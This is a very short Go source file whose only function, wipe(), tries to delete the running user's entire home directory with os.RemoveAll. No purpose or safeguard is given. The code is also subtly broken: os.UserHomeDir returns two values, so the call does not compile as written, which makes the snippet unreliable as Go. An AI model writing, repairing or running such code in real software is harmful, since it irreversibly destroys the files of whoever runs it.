package main

import "os"

func wipe() error {
	return os.RemoveAll(os.UserHomeDir())
}
